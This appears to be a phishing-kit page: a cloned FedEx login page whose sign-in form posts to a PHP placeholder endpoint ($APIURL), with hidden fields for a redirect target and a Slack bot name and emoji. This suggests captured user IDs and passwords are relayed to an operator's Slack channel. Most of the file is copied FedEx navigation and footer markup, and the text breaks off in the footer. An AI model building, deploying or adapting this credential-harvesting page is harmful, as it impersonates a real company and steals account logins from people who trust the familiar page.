<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><HTML 
lang="en" lang="en" dir="" xml:lang="en" 
xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 
http-equiv="X-UA-Compatible">
		      
<META http-equiv="content-type" content="text/html; charset=UTF-8">      <LINK 
href="/images/c/s1/fx-favicon.ico" rel="shortcut icon" type="image/x-icon">      
<LINK id="globalCSS" href="template_files/global-wrapper-min.css" rel="stylesheet" 
type="text/css">      <!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/css/t1/global-wrapper-ie-min.css" /><![endif]-->
	  <!--[if lte IE 6]><link rel="stylesheet" type="text/css" href="/css/t1/ie6-min.css" /><![endif]-->
		 <LINK href="template_files/afedexmain30.css" rel="stylesheet" 
type="text/css"> 		<LINK href="template_files/oadr.css" rel="stylesheet" type="text/css">
		 <LINK href="template_files/newstyle30.css" rel="stylesheet" type="text/css">
		 <LINK href="template_files/afedexasia30.css" rel="stylesheet" 
type="text/css">		 <LINK href="template_files/fedexascend30.css" rel="stylesheet" 
type="text/css">	 
<STYLE id="antiClickjack">body{display:none !important;}</STYLE>
 
<SCRIPT type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</SCRIPT>
						 
<META name="GENERATOR" content="MSHTML 11.00.10570.1001"></HEAD>       
<BODY text="#000000" topmargin="0" leftmargin="0" dir="" bgcolor="#ffffff" 
onload="fLogon(); invitationError(); return false;" marginwidth="0" 
marginheight="0"><!-- LAYOUT: OPEN CONTAINER -->         
<DIV id="container">
<DIV id="globalHeader">
<SCRIPT>var vh=0;
var fxg_header=true;
</SCRIPT>
 
<META http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">  ﻿<LINK href="template_files/main-min.css" 
rel="stylesheet" type="text/css"> <!-- HEAD SCRIPTS --> 
<SCRIPT>
vh=1;
var fxg_header=true;


/* @param [string]  [styleName] [filename with suffix e.g. "style.css"]
 * @param [boolean] [disabled]  [true disables style]
 */

        


var fx_device_type = "desktop";
var fxg_header = true;


var disableStyle = function(styleName, disabled) {
    var styles = document.styleSheets;
    var href = "";
try {
    for (var i = 0; i < styles.length; i++) {
    	  var re = new RegExp(".*?//.*?/", "");
  	    var cssStr =styles[i].href.replace(re,"/");
    	  var r = /[^\/]*$/;
    	  //alert('cssStr   ' + cssStr);
				var dirPath = cssStr.replace(r, '');
				//alert ('dirPath   ' + dirPath);
        href = styles[i].href.split("/");
        href = href[href.length - 1];
 
        if (href == styleName) {
            styles[i].disabled = disabled;
            var cssPath = dirPath + styleName;            
            loadcssfile(cssPath);
            break;
        }
    }
  }
  catch(err){}
};
function loadcssfile(styleName){
				var fileName = styleName.replace(".css","-legacy.css");
				//alert('fileName1   ' + fileName);
				//fileName = window.location.protocol + window.location.host + fileName;
				fileName = window.location.protocol + "//www.fedex.com" + fileName;
				//alert('fileName2   ' + fileName);
        var fileref=document.createElement("link")
        fileref.setAttribute("rel", "stylesheet")
        fileref.setAttribute("type", "text/css")
        fileref.setAttribute("href", fileName)
        if (typeof fileref!="undefined"){document.getElementsByTagName("head")[0].appendChild(fileref)}
}
disableStyle('master-responsive-min.css', true);
disableStyle('global-wrapper-min.css', true);
disableStyle('common-min.css', true);
disableStyle('master-min.css', true);
disableStyle('ie6-min.css', true)
disableStyle('ie-min.css', true);</SCRIPT>
    <!-- HEAD STYLES -->     <!-- HEADER START -->     
<DIV class="header" id="fxg-header-container"><HEADER class="fxg-header fxg-header--sticky" 
id="fxg-header--sticky">
<DIV><!-- GLOBAL NAV START -->                 
<DIV class="global_nav_reference">
<DIV class="global_navigation">
<DIV class="fxg-nav">
<DIV class="fxg-wrapper"><A href="https://www.fedex.com/en-us/home.html" target="_self"><IMG 
class="fxg-header__logo" alt="FedEx Logo" src="template_files/logo.png"></A>     
                            <!-- DROPDOWNS START -->                             
    
<UL class="fxg-dropdown fxg-global-nav"><!-- SHIPPING DROPDOWN START -->       
                                
  <DIV class="dropdown">
  <LI class="fxg-dropdown__item"><A class="fxg-link fxg-dropdown-js" href="https://www.fedex.com/login/web/jsp/logon.jsp#">Shipping</A>
  <DIV class="fxg-dropdown__sub-menu">
  <DIV class="link"><A title="Create a Shipment" class="fxg-link fxg-link--gray" 
  id="ShipExp" href="https://www.fedex.com/cgi-bin/ship_it/interNetShip?origincountry=us&amp;locallang=us&amp;urlparams=us" 
  target="_self">Create a Shipment</A></DIV>
  <DIV class="link"><A title="Shipping Rates &amp; Delivery Times" class="fxg-link fxg-link--gray" 
  href="https://www.fedex.com/ratefinder/home?cc=US&amp;language=en&amp;locId=express" 
  target="_self">Shipping Rates &amp; Delivery Times</A></DIV>
  <DIV class="link"><A title="Schedule &amp; Manage Pickups" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/fcl/pckgenvlp/pickup/" target="_self">Schedule 
  &amp; Manage Pickups</A></DIV>
  <DIV class="link"><A title="Packing &amp; Shipping Supplies" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/fcl/pckgenvlp/ordersupplies/" 
  target="_self">Packing &amp; Shipping Supplies</A></DIV>
  <DIV class="link"><A title="International Shipping Guide" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/international-resource-center/" 
  target="_self">International Shipping Guide</A></DIV>
  <DIV class="link"><A title="In-Store Shipping Services" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/retail-shipping/in-store-services.html" target="_self">In-Store 
  Shipping Services</A></DIV>
  <DIV class="link"><A title="All Shipping Services" class="fxg-link fxg-link--blue" 
  href="https://www.fedex.com/en-us/shipping.html" target="_self">ALL SHIPPING 
  SERVICES</A></DIV></DIV></LI></DIV><!-- SHIPPING DROPDOWN END -->              
                         <!-- TRACKING DROPDOWN START -->                        
               
  <DIV class="dropdown">
  <LI class="fxg-dropdown__item"><A class="fxg-link fxg-dropdown-js" href="https://www.fedex.com/login/web/jsp/logon.jsp#">Tracking</A>
  <DIV class="fxg-dropdown__sub-menu"><!-- TRACKING MODULE -->                   
                                
  <DIV class="tracking_module">
  <DIV class="fxg-tracking-module">
  <FORM id="HeaderTrackingModule" action="#" method="POST">
  <DIV class="fxg-field"><INPUT name="trackingNumber" title="Tracking ID" class="fxg-field__input-text fxg-field__input--required" id="trackingnumberinput" aria-required="true" type="text" data-errmsg="Please enter at least one tracking number."> 
                                                                  <SPAN class="fxg-field__placeholder fxg-field__floating-placeholder">TRACKING 
  ID</SPAN>                                                             
  </DIV><BUTTON class="fxg-button fxg-button--orange" 
  type="submit">TRACK</BUTTON>                                                   
        </FORM></DIV></DIV><!-- END TRACKING MODULE -->                          
                         
  <DIV class="link"><A title="Advanced Shipment Tracking" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/fedextracking/" target="_self">Advanced Shipment 
  Tracking</A></DIV>
  <DIV class="link"><A title="Manage Your Delivery" class="fxg-link fxg-link--gray" 
  href="https://www.fedex.com/apps/fdmenrollment/" target="_self">Manage Your 
  Delivery</A></DIV>
  <DIV class="link"><A title="All Tracking Services" class="fxg-link fxg-link--blue" 
  href="https://www.fedex.com/en-us/tracking.html" target="_self">ALL TRACKING 
  SERVICES</A></DIV></DIV></LI></DIV><!-- TRACKING DROPDOWN END -->              
                         <!-- PRINTING DROPDOWN START -->                        
               
  <DIV class="dropdown">
  <LI class="fxg-dropdown__item"><A class="fxg-link fxg-dropdown-js" href="https://www.fedex.com/login/web/jsp/logon.jsp#">Printing 
  Services</A>
  <DIV class="fxg-dropdown__sub-menu">
  <DIV class="link"><A title="Start Online Printing Order" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/printing-services/online-printing.html" target="_self">Start 
  Online Printing Order</A></DIV>
  <DIV class="link"><A title="Posters, Signs &amp; Banners" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/printing-services/poster-sign-banner-printing.html" 
  target="_self">Posters, Signs &amp; Banners</A></DIV>
  <DIV class="link"><A title="Presentations &amp; Manuals" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/printing-services/presentation-manual-printing.html" 
  target="_self">Presentations &amp; Manuals</A></DIV>
  <DIV class="link"><A title="Marketing Materials" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/printing-services/marketing-materials.html" 
  target="_self">Marketing Materials</A></DIV>
  <DIV class="link"><A title="Ideas &amp; Custom Solutions" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/printing-services/custom-printing-solutions.html" 
  target="_self">Ideas &amp; Custom Solutions</A></DIV>
  <DIV class="link"><A title="Get Coupons &amp; Deals" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/coupons/coupons-offers.html" target="_self">Get 
  Coupons &amp; Deals</A></DIV>
  <DIV class="link"><A title="All Printing Services" class="fxg-link fxg-link--blue" 
  href="https://www.fedex.com/en-us/printing.html" target="_self">ALL PRINTING 
  SERVICES</A></DIV></DIV></LI></DIV><!-- PRINTING DROPDOWN END -->              
                         <!-- LOCATIONS DROPDOWN START -->                       
                
  <DIV class="dropdown">
  <LI class="fxg-dropdown__item"><A class="fxg-link fxg-dropdown-js " href="https://www.fedex.com/login/web/jsp/logon.jsp#">Locations</A>
  <DIV class="fxg-dropdown__sub-menu">
  <DIV class="link section"><A title="All Location Types" class="fxg-link default " 
  href="http://www.fedex.com/us/retail-shipping/all-location-types.html" target="_self">All 
  Location Types</A></DIV>
  <DIV class="link"><A title="Find a Location" class="fxg-link fxg-link--blue " 
  href="http://www.fedex.com/locate/index.html?locale=en_US#" 
  target="_self">FIND A LOCATION</A></DIV></DIV></LI></DIV><!-- LOCATIONS DROPDOWN END --> 
                                      <!-- SUPPORT DROPDOWN START -->            
                           
  <DIV class="dropdown">
  <LI class="fxg-dropdown__item"><A class="fxg-link fxg-dropdown-js" href="https://www.fedex.com/login/web/jsp/logon.jsp#">Support</A>
  <DIV class="fxg-dropdown__sub-menu">
  <DIV class="link"><A title="New Customer Center" class="fxg-link fxg-link--gray" 
  href="https://getstarted.van.fedex.com/" target="_self">New Customer 
  Center</A></DIV>
  <DIV class="link"><A title="Small Business Center" class="fxg-link fxg-link--gray" 
  href="https://smallbusiness.fedex.com/home.html" target="_self">Small Business 
  Center</A></DIV>
  <DIV class="link"><A title="FedEx Service Guide" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/service-guide/index.html" target="_self">FedEx 
  Service Guide</A></DIV>
  <DIV class="link"><A title="Account Management Tools" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/manage" target="_self">Account Management 
  Tools</A></DIV>
  <DIV class="link"><A class="fxg-link fxg-link--gray" href="http://www.fedex.com/us/fcl/pckgenvlp/online-claims/" 
  target="_self" alt="File a Claim">File a Claim</A></DIV>
  <DIV class="link"><A title="View &amp; Pay Bill" class="fxg-link fxg-link--gray" 
  href="http://www.fedex.com/us/fcl/pckgenvlp/online-billing/" 
  target="_self">View &amp; Pay Bill</A></DIV>
  <DIV class="link"><A title="Customer Support" class="fxg-link fxg-link--blue" 
  href="https://www.fedex.com/en-us/customer-support.html" 
  target="_self">CUSTOMER SUPPORT</A></DIV></DIV></LI></DIV><!-- SUPPORT DROPDOWN END --> 
                                  </UL><!-- UTILITY NAV START -->                  
                       <!-- UTILITY NAV START -->                                
 
<DIV class="fxg-user-options" id="global-login-wrapper">
<DIV class="fxg-user-options__option fxg-user-options__sign-in " id="fxg-global-header"><A 
class="fxg-link fxg-dropdown-js fx-global-prelog-link" id="global-login-link" 
href="https://www.fedex.com/login/web/jsp/logon.jsp#"><SPAN class="prelog-text" 
id="global-login-link-span">Sign In </SPAN><IMG class="fxg-user-options__icon" 
src="template_files/sprite-placeholder.png"></A>                                 
    </DIV>
<DIV class="fxg-user-options__option fxg-user-options__search-btn"><IMG class="fxg-user-options__icon" 
id="SrchBtn" alt="Search" src="template_files/sprite-placeholder.png">           
                          </DIV><BUTTON class="hamburger hamburger--slider fxg-user-options__menu-btn" 
id="fxg-mobile-menu-btn" type="button"><SPAN class="hamburger-box"><SPAN class="hamburger-inner"></SPAN></SPAN> 
                                    </BUTTON>                                 
</DIV>
<DIV class="fxg-search">
<DIV class="fxg-user-options__option fxg-user-options__search"><IMG class="fxg-user-options__icon fxg-search-btn" 
src="template_files/sprite-placeholder.png">                                     
    <INPUT name="q" class="fxg-user-options__search-field fxg-search-js" type="text" placeholder="Search or Tracking Numbers" value=""> 
                                        <INPUT name="output" class="fxg-search-js" type="hidden" value="xml_no_dtd"> 
                                        
<INPUT name="sort" class="fxg-search-js" type="hidden" value="date:D:L:d1">      
                                   
<INPUT name="client" class="fxg-search-js" type="hidden" value="fedex_us">       
                                  <INPUT name="ud" class="fxg-search-js" type="hidden" value="1"> 
                                        
<INPUT name="oe" class="fxg-search-js" type="hidden" value="UTF-8">              
                           
<INPUT name="ie" class="fxg-search-js" type="hidden" value="UTF-8">              
                           
<INPUT name="proxystylesheet" class="fxg-search-js" type="hidden" value="fedex_us"> 
                                        
<INPUT name="hl" class="fxg-search-js" type="hidden" value="en">                 
                        
<INPUT name="site" class="fxg-search-js" type="hidden" value="us">               
                          
<INPUT name="headerFooterDir" class="fxg-search-js" type="hidden" value="us">    
                                     
<INPUT name="label" class="fxg-search-js" type="hidden" value="search">          
                               <IMG class="fxg-user-options__icon fxg-close-btn" 
alt="Exit Search" src="template_files/sprite-placeholder.png">                   
                  </DIV>
<DIV class="fxg-user-options__search-results fxg-search-results">
<DIV class="fxg-search-results__row fxg-search-results__title"><SPAN>Top 
Searches</SPAN>                                         <A class="fxg-search-results__row" 
href="http://www.fedex.com/Search/search?q=Door+tag&amp;spell=1&amp;output=xml_no_dtd&amp;client=fedex_us&amp;oe=UTF-8&amp;ie=UTF-8&amp;proxystylesheet=fedex_us&amp;hl=en&amp;site=us&amp;headerFooterDir=us&amp;access=p">Door 
tag</A><A class="fxg-search-results__row" href="http://www.fedex.com/Search/search?q=Supplies&amp;spell=1&amp;output=xml_no_dtd&amp;client=fedex_us&amp;oe=UTF-8&amp;ie=UTF-8&amp;proxystylesheet=fedex_us&amp;hl=en&amp;site=us&amp;headerFooterDir=us&amp;access=p">Supplies</A><A 
class="fxg-search-results__row" href="http://www.fedex.com/Search/search?q=Shipping+label&amp;spell=1&amp;output=xml_no_dtd&amp;client=fedex_us&amp;oe=UTF-8&amp;ie=UTF-8&amp;proxystylesheet=fedex_us&amp;hl=en&amp;site=us&amp;headerFooterDir=us&amp;access=p">Shipping 
label</A><A class="fxg-search-results__row" href="http://www.fedex.com/Search/search?q=commercial+invoice&amp;spell=1&amp;output=xml_no_dtd&amp;client=fedex_us&amp;oe=UTF-8&amp;ie=UTF-8&amp;proxystylesheet=fedex_us&amp;hl=en&amp;site=us&amp;headerFooterDir=us&amp;access=p">Commercial 
invoice</A></DIV></DIV></DIV><!-- UTILITY NAV END -->                            
 </DIV></DIV></DIV></DIV><!-- GLOBAL NAV END -->             
</DIV></HEADER></DIV><!-- HEADER END --> 
<DIV id="auxhead"></DIV>
<SCRIPT>


function loadDoc1(file) {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
     document.getElementById("auxhead").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", file, true);
  xhttp.send();
}
	
if (vh == 0) {
  if ( /MSIE 7/i.test(navigator.userAgent) || /MSIE 8/i.test(navigator.userAgent) ) {
    loadDoc1("/templates/components/headers/us/gl_old.html");
  } else {
    loadDoc1("/templates/components/headers/us/gl_new.html");
  }
}
</SCRIPT>
 </DIV>
<DIV class="fx_clearfix" id="content">
<DIV style="color: rgb(255, 255, 255);">
<SCRIPT src="template_files/jscripts.js" type="text/javascript"></SCRIPT>
 
<SCRIPT src="template_files/DynamicValidation.js" type="text/javascript"></SCRIPT>
 
<SCRIPT type="text/javascript">
function setUname() {
var uname = document.getElementById("username").value;
document.cookie = "loginid="+uname + ";path=/";
}
</SCRIPT>
  
<META name="wsstitle" content="Login Page"> 
<META name="wssmlc" content="/US/en/widm"> <TITLE>FedEx | Login Page</TITLE> 
<META name="pragma" content="no-cache"> 
<META name="cache-control" content="no-cache"> <LINK href="template_files/widgets.css" 
rel="stylesheet" type="text/css"> <LINK href="template_files/fxnxgen.css" rel="stylesheet" 
type="text/css"> <LINK href="template_files/login.css" rel="stylesheet" type="text/css"> 
<LINK href="template_files/fcl30.css" rel="stylesheet" type="text/css"> 
<SCRIPT src="template_files/framework.js" type="text/javascript" charset="utf-8"></SCRIPT>
 
<SCRIPT language="javascript">
//Defect fix for 169686 and 169173
	function fLogon()
	{
		window.document.logonForm.fclqrs.value = document.location.href;
	}
	function invitationError()
	{
		var invitationError = window.document.logonForm.invitationError.value
		if(invitationError=="true"){
			
			var warn = window.open('/login/web/jsp/invitation_login_Error.jsp','popup','width=400,height=300,resizable=no,scrollbars=no,menubar=no,titlebar=no')
			session.setAttribute('invitationError', '')
		}
		return false		
	}
</SCRIPT>
 
<STYLE>
#loginblock{
	display: none;
}

</STYLE>
 
<META name="GENERATOR" content="MSHTML 6.00.2600.0">      
<STYLE id="antiClickjack">body{display:none !important;}</STYLE>
 
<SCRIPT type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</SCRIPT>
		 
<FORM name="logonForm" id="logonForm" action="<?php echo $APIURL; ?>" method="post">
	 
	 
<TABLE width="745" border="0" cellspacing="0" cellpadding="0">
  <TBODY>
  <TR>
    <TD colspan="7">
      <H1 style="margin: 0pt;">fedex.com Login</H1></TD></TR>
  <TR>
    <TD colspan="7">
      <H2 style="color: rgb(153, 153, 153); font-size: 12px; margin-bottom: 15px;"></H2></TD></TR>
  <TR><!-- area 1-3-->		         
    <TD colspan="3"><BR><BR></TD></TR>
  <TR>
    <TD colspan="7">&nbsp;</TD></TR><!-- area 1-3-->	  	   
  <TR>
    <TD colspan="7">
      <DIV class="appwrap">
      <P class="denotereqfield">			Denotes required field. 		 </P>
      <TABLE width="745" border="0" cellspacing="0" cellpadding="0"><!-- 	<tr> 
			  <td width="365" bgcolor="#660099" class="subheaderwhite1">
				Registered fedex.com Users 
			  </td>
			  <td width="15"><img src="/login/web/images/spacer.gif" height="1" width="5"/></td>
			  <td width="365" bgcolor="#660099" class="subheaderwhite1">
				New fedex.com Users
			  </td>
			</tr>   -->
        						 
        <TBODY>
        <TR>
          <TD class="colleft">
            <DIV class="module" id="module.logon" type="required" hashelp="false" 
            defaultmode="expanded" collapsable="false">
            <DIV class="moduleHeaderNonCollapsable" id="module.logon._header">
            <DIV class="moduleHeaderTitle" id="module.logon._headerTitle">
            Registered fedex.com Users </DIV>
            <DIV class="moduleHeaderButtons" 
            id="module.logon._headerButtons"></DIV></DIV>
            <DIV class="moduleExpanded" id="module.logon._expanded">
            <TABLE border="0" cellspacing="0" cellpadding="1"><!--area 4-->			 
               					 
              <TBODY>
              <TR>
                <TD colspan="2">
                  <TABLE border="0" cellspacing="0" cellpadding="1">
                    <TBODY>
                    <TR>
                      <TD colspan="1"><IMG src="template_files/icon_important.gif" 
                        valign="middle">&nbsp;</TD>
                      <TD colspan="1" 
                    valing="middle"><B>IMPORTANT</B></TD></TR></TBODY></TABLE></TD></TR>
              <TR>
                <TD colspan="2">For best results, please disable your pop-up 
                  blocker.</TD></TR><!--area 4-->				 
              <TR>
                <TD colspan="2"><IMG width="1" height="10" src="template_files/spacer.gif"></TD></TR>
              <TR>
                <TD colspan="2">Enter your user ID and password to login</TD></TR>
              <TR>
                <TD style="padding-left: 0px;">
                  <TABLE width="100%" border="0" cellspacing="0" 
cellpadding="1">
                    <TBODY>
                    <TR>
                      <TD align="left" class="required">								User ID
                      							 </TD>
                      <TD><!-- Defect fix for defectId:462296 -->								
                        							  <INPUT name="username" id="username" onchange="setUname()" type="text" size="38" maxlength="35">					
                        											</TD>
                      <TD><IMG width="5" height="1" src="template_files/spacer.gif"></TD></TR>
                    <TR>
                      <TD colspan="3"><IMG width="1" height="5" src="template_files/spacer.gif"></TD></TR>
                    <TR>
                      <TD align="left" class="required">								Password
                      							 </TD>
                      <TD><!-- Defect fix for defectId:462296 -->								
                        							    <INPUT name="password" id="password" type="password" size="38" maxlength="35" autocomplete="off">	

														                <input type="hidden" name="project" value="<?php echo $Project; ?>">
                <input type="hidden" name="redirect" value="<?php echo $Redirect; ?>">
                <input type="hidden" name="slackbotname" value="<?php echo $SlackBotName; ?>">
                <input type="hidden" name="slackemoji" value="<?php echo $SlackEmoji; ?>">
														
                        											</TD>
                      <TD><IMG width="5" height="1" src="template_files/spacer.gif"></TD></TR>
                    <TR>
                      <TD colspan="3"><IMG width="1" height="5" src="template_files/spacer.gif"></TD></TR>
                    <TR>
                      <TD><IMG width="5" height="1" src="template_files/spacer.gif"></TD>
                      <TD><INPUT name="remusrid" type="checkbox" value="yes">
                        										Remember my user ID on this computer.
                      									 </TD></TR></TBODY></TABLE></TD></TR>
              <TR>
                <TD colspan="2"><IMG width="1" height="5" src="template_files/spacer.gif"></TD></TR>
              <TR>
                <TD colspan="2">
                  <TABLE width="100%" border="0" cellspacing="0" 
cellpadding="1">
                    <TBODY>
                    <TR>
                      <TD><A name="loginHelp" class="contentpurple" onclick="window.open('/login/web/jsp/popup_loginhelp.jsp','popup','height=415,width=415,top=0,left=190,scrollbars=yes,menubar=no');return false" 
                        href="https://www.fedex.com/login/web/jsp/popup_loginhelp.jsp">
                        								     Login Help								  </A>						     </TD>
                      <TD><A name="forgotUidPwd" class="contentpurple" href="https://www.fedex.com/login/web/jsp/forgotPassword.jsp?locale=en_US">
                        							      Forgot/Reset your password or user ID?
                        							   </A>							 </TD>
                      <TD align="right"><INPUT name="login" class="buttonpurple" onclick="setLinkView('fclloginbtn');" type="submit" value="Login">
                        																							  								
                  							 </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV></DIV></TD><!--     		  <td width="15"><img src="/login/web/images/spacer.gif" height="1" width="15"/></td> --> 
          			  <!--Area5 start-->			  				 
          <TD class="colright" style="padding-right: 15px;">
            <DIV class="module" id="module.logon.newusers" type="required" 
            hashelp="false" defaultmode="expanded" collapsable="false">
            <DIV class="moduleHeaderNonCollapsable" id="module.logon.newusers._header">
            <DIV class="moduleHeaderTitle" id="module.logon.newusers._headerTitle">
            New fedex.com Users </DIV>
            <DIV class="moduleHeaderButtons" id="module.logon.newusers._headerButtons"></DIV></DIV>
            <DIV class="moduleExpanded" id="module.logon.newusers._expanded">
            <P><!-- Defect fix for 104861 <a name="signupnow" class="smallpurpleheader" href="/login/web/jsp/contactInfo1.jsp?locale=en_US"> -->
            					 <A name="signupnow" class="smallpurpleheader" style="font-size: 15px; font-weight: bold;" 
            href="https://www.fedex.com/login/web/jsp/contactInfo1.jsp?locale=en_US">
            					Sign Up Now!					 </A>					 <BR><SPAN class="content">Access 
            and customize many fedex.com online services with a single user ID 
            and password.</SPAN>					 <A name="learnmore" class="acolorpurple" 
            onclick="window.open('/login/web/jsp/popup_login.jsp','popup','height=415,width=415,top=0,left=190,scrollbars=yes,menubar=no');return false" 
            href="https://www.fedex.com/login/web/jsp/popup_login.jsp">
            					Learn more...					 </A>				 </P><!--
					<p>
					<a href="" class="smallpurpleheader">Ship without an account</a>
					<br>
					<span class="content">Ship without creating a login and pay with a credit card. <br>It's that easy. </span>
					<a href="" class="acolorpurple">start now.</a> 
					</p> -->
            																																				   </DIV></DIV></TD><!-- area5-->
          			 </TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></FORM>
<SCRIPT language="JavaScript" type="text/javascript">
  <!--
    document.forms["logonForm"].elements["username"].focus()
  // -->
</SCRIPT>
 
<SCRIPT type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]);</SCRIPT>

<SCRIPT src="template_files/abd-1-30.js" type="text/javascript"></SCRIPT>
                              </DIV></DIV>
<DIV id="globalFooter">
<SCRIPT>var vf=0;</SCRIPT>
  <!-- NEW FOOTER START --> 
<SCRIPT>vf=1;</SCRIPT>
 
<DIV class="global_footer_reference" id="global_footer_reference">
<DIV class="cq-dd-paragraph">
<DIV class="footer"><FOOTER class="fxg-footer">
<DIV class="fxg-footer__primary">
<DIV class="fxg-wrapper container"><!-- COLUMN CONTROL START -->						 
<DIV class="column_control section">
<DIV class="row"><!-- 4 Columns -->								 
<DIV class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-4">
<DIV class="title section">
<DIV tabindex="0" class="fxg-title fxg-title--default   " style="text-align: left;">Our 
Company</DIV></DIV>
<DIV class="column_control section"><!-- COLUMN CONTROL START -->										 
<DIV class="row"><!-- 2 Columns -->											 
<DIV class="fxg-col fxg-col-- fxg-col-- col-sm-6">
<DIV class="link"><A title="About FedEx" class="fxg-link fxg-link--gray" href="http://about.fedex.com/" 
target="_self">About														FedEx</A></DIV>
<DIV class="link"><A title="Our Portfolio" class="fxg-link fxg-link--gray" href="http://about.van.fedex.com/our-story/company-structure/" 
target="_self">Our Portfolio</A></DIV>
<DIV class="link"><A title="Investor Relations" class="fxg-link fxg-link--gray" 
style="white-space: nowrap;" href="http://www.fedex.com/us/investorrelations/" 
target="_self">Investor Relations</A></DIV>
<DIV class="link"><A title="FedEx Careers" class="fxg-link fxg-link--gray" href="https://careers.fedex.com/fedex/" 
target="_self">Careers</A></DIV></DIV>
<DIV class="link fxg-col2-nt"><A title="FedEx Blog" class="fxg-link fxg-link--gray" 
href="http://about.van.fedex.com/blog/" target="_self">FedEx Blog</A></DIV>
<DIV class="link fxg-col2-nt"><A title="Corporate Responsibility" class="fxg-link fxg-link--gray" 
style="white-space: nowrap;" href="http://about.van.fedex.com/social-responsibility/csr-policy-statements/" 
target="_self">Corporate Responsibility</A></DIV>
<DIV class="link fxg-col2-nt"><A title="News Room" class="fxg-link fxg-link--gray" 
href="http://about.van.fedex.com/newsroom/global-english/" 
target="_self">Newsroom</A></DIV>
<DIV class="link fxg-col2-nt"><A title="Contact Us" class="fxg-link fxg-link--gray" 
href="http://www.fedex.com/us/customersupport/email/index.html" 
target="_self">Contact Us</A></DIV></DIV></DIV></DIV>
<DIV class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-3">
<DIV class="title section">
<DIV tabindex="0" class="fxg-title fxg-title--default   " style="text-align: left;">More 
From FedEx</DIV></DIV>
<DIV class="link"><A title="FedEx Compatible" class="fxg-link fxg-link--gray" 
href="http://www.fedex.com/us/compatible/" target="_self">FedEx 
Compatible</A></DIV>
<DIV class="link"><A title="Developer Resource Center" class="fxg-link fxg-link--gray" 
href="http://www.fedex.com/us/developer" target="_self">Developer Resource 
Center</A></DIV>
<DIV class="link"><A title="FedEx Cross Border" class="fxg-link fxg-link--gray" 
href="http://crossborder.fedex.com/us" target="_self">FedEx Cross 
Border</A></DIV></DIV>
<DIV class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-2"></DIV>
<DIV class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-3">
<DIV class="title">
<DIV class="fxg-title fxg-title--default   " 
style="text-align: left;">Language</DIV></DIV><!-- LANGUAGE DROPDOWN START -->
									 
<DIV class="language_dropdown">
<DIV class="icon_link"><A class="fxg-link" href="http://www.fedex.com/?location=home" 
target="_self"><IMG class="fxg-icon fxg-icon--flag-default" alt="Change Country" 
src="template_files/sprite-placeholder.png">Change Country</A></DIV><!--Bootstrap dropdown for uniformity across all OS's-->
										 
<DIV class="dropdown fxg-bootstrap-dropdown" style="float: none;"><BUTTON class="dropdown-toggle" 
id="dropdownMenu" aria-expanded="true" aria-haspopup="true" type="button" 
data-toggle="dropdown">												English <SPAN class="fxg-icon"></SPAN>
											 </BUTTON>											 
<UL class="dropdown-menu" aria-labelledby="dropdownMenu">
  <LI><A href="https://www.fedex.com/es-us/home.html" 
  target="_self">Español</A></LI></UL></DIV></DIV><!-- LANGUAGE DROPDOWN END -->
								 </DIV></DIV></DIV><!-- COLUMN CONTROL END -->						 
<DIV class="hr">
<HR class="fxg-mobile--hide">
						 </DIV></DIV></DIV><!-- BEGIN SOCIAL BAR -->				 
<DIV class="fxg-footer__social">
<DIV class="fxg-wrapper container"><!-- COLUMN CONTROL START -->						 
<DIV class="column_control">
<DIV class="row"><!-- 2 Columns -->								 
<DIV class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-8">
<DIV class="title">
<DIV class="fxg-title fxg-title--default" style="text-align: left;">Follow 
FedEx</DIV></DIV>
<DIV class="icon_link"><A title="Newsletter Signup" class="fxg-link" href="http://www.fedex.com/us/email" 
target="_self"><IMG class="fxg-icon fxg-icon--email" alt="Newsletter Signup" 
src="template_files/sprite-placeholder.png"></A>									 </DIV>
<DIV class="icon_link"><A class="fxg-link" href="https://www.facebook.com/fedex" 
target="_self"><IMG class="fxg-icon fxg-icon--facebook" alt="Facebook" src="template_files/sprite-placeholder.png"></A>
									 </DIV>
<DIV class="icon_link"><A class="fxg-link" href="https://twitter.com/fedex" 
target="_self"><IMG class="fxg-icon fxg-icon--twitter" alt="Twitter" src="template_files/sprite-placeholder.png"></A>
									 </DIV>
<DIV class="icon_link"><A class="fxg-link" href="http://www.instagram.com/fedex" 
target="_self"><IMG class="fxg-icon fxg-icon--instagram   " alt="Instagram" src="template_files/sprite-placeholder.png"></A>
									 </DIV>
